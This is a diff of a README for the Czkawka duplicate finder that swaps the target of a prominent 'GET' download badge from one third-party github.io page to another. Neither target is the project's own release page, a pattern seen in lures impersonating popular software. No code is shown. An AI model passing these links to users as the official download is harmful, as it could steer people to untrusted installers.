@@ -36,7 +36,7 @@ Czkawka covers more junk types in one binary. A dedicated CLI can be faster on a
 
 Get one build. Use the button, then pick the asset for your OS. First launch lives under Running.
 
-[![GET Czkawka Duplicate Finder](https://img.shields.io/badge/GET-Czkawka%20Duplicate%20Finder-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Czkawka-Duplicate-Finder)
+[![GET Czkawka Duplicate Finder](https://img.shields.io/badge/GET-Czkawka%20Duplicate%20Finder-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://czkawka-duplicate-file-finder.github.io/Czkawka-GUI/)
 
 Desktop: tagged archive, portable zip, or a distro package. CLI: the same release page or `cargo install` if you already have Rust. Nightly builds exist for testers. Daily cleaning should stay on a tag.
 
